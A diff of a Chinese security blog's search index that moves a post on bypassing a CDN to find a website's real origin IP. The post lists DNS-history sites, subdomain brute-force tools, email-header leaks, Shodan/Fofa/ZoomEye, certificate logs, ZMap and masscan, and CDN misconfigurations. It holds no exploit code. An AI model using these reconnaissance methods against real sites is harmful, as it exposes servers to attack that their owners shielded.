+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
+<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
+<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
+<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
+<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
+<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
+<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
+SSL证书搜索引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
+<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
+<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
+国外多PING测试工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="七、全网扫描">七、全网扫描</h2>
+<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
+<ol>
+<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
+<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
+<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
+<ul>
+<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
+<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SqlMap代理池</title>
     <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
     <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
@@ -1234,65 +1293,6 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </categories>
       <tags>
         <tag>Sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕过CDN寻找真实IP</title>
-    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
-    <content><![CDATA[<blockquote>
-<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
-</blockquote>
-<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
-<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
-<h2 id="二、子域名">二、子域名</h2>
-<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
-常用的子域名查找方法和工具：</p>
-<ol>
-<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
-<li>在线查询网站：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>子域名爆破工具</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
-<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
-<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
-<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
-<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
-<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
-<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
-SSL证书搜索引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
-<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
-<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
-国外多PING测试工具：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
-<h2 id="七、全网扫描">七、全网扫描</h2>
-<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
-<ol>
-<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
-<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
-<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
-<ul>
-<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
-<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
       </tags>
   </entry>
 </search>
